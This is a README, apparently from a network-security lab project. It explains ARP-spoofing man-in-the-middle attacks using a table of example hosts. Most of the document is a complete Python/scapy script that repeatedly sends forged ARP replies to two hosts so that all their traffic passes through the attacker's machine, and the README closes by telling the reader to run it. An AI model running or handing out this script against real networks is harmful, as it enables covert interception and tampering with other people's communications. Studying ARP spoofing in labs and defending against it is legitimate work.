# simple_arpspoof

## How does it work

Suppose there are three hosts, A, B and M on the same LAN.

M wants to intercept the packet between A and B. Then M must convince A that he is B, so all the packets from A to B would be forwarded to M. At the same time, M must convince B that he is A, so all the traffic from B to A would be forwarded to M first.

After this, the route from A to B becomes A -> M -> B, and the route from B to A becomes B -> M -> A. In this way, M intecepts all the traffic between A and B.

In ARP, we use opcode 2 to represent an ARP reply. The semantic of ARP reply is to tell the request host what's the corresponding MAC address of the request IP.

For example, we have the following configuration:

| Host | IP         | MAC               |
| ---- | ---------- | ----------------- |
| A    | 10.9.0.5   | 02:42:0a:09:00:05 |
| B    | 10.9.0.6   | 02:42:0a:09:00:06 |
| M    | 10.9.0.105 | 02:42:0a:09:00:69 |

M convinces A that B(10.9.0.6) is at 02:42:0a:09:00:69(M), convinces B that A(10.9.0.5) is at 02:42:0a:09:00:69(M).

## python code

```python
import scapy.all as scapy
import time

packet_1 = scapy.ARP(op=2, pdst='10.9.0.6',
                     hwdst='02:42:0a:09:00:06', psrc='10.9.0.5')
packet_2 = scapy.ARP(op=2, pdst='10.9.0.5',
                     hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')


def start_spoof():
    while True:
        scapy.send(packet_1)
        scapy.send(packet_2)
        time.sleep(1)


if __name__ == '__main__':
    start_spoof()

```

Run this code at M, then we are done.